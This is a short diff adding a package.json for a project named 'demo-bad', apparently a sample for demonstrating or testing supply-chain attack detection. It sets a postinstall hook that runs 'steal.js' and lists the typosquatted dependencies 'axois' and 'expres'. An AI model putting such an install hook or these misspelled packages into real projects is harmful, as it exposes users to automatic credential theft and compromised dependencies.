@@ -1,0 +1,6 @@
+{
+  "name": "demo-bad",
+  "version": "0.1.0",
+  "scripts": { "postinstall": "node steal.js" },
+  "dependencies": { "axois": "1.0.0", "expres": "4.0.0" }
+}
